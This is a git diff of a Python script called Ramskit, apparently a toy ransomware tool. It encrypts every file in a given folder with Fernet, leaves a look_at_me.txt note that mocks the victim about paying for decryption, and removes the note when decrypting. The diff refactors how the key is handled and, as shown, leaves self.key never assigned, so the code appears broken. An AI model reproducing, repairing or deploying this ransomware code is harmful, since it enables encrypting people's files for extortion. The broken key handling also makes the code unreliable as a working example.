@@ -22,8 +22,8 @@ from cryptography.fernet import Fernet
 
 
 class Ramskit:
-    def __init__(self, key):
-        self.key = key
+    def __init__(self):
+        print("[x] Starting Ramskit")
 
     def encrypt_file(self, items):
         f = Fernet(self.key)
@@ -68,13 +68,11 @@ if __name__ == '__main__':
     action = args.action.lower()
     path = args.path
 
-    key = load_key()
-
-    ramskit = Ramskit(key)
-    ramskit.generate_key()
+    ramskit = Ramskit()
 
     match action:
         case 'encrypt':
+
             items = os.listdir(path)
             ramskit.encrypt_file(items)
 
@@ -85,6 +83,11 @@ if __name__ == '__main__':
                     decrypt's purchase lololololol \n\n
                 ''')
         case 'decrypt':
+            
+            if not os.path.exists(path + '/look_at_me.txt'):
+                print('No look_at_me.txt file found. Exiting...')
+                sys.exit(1)
+            
             os.remove(path + '/look_at_me.txt')
             items = os.listdir(path)
 
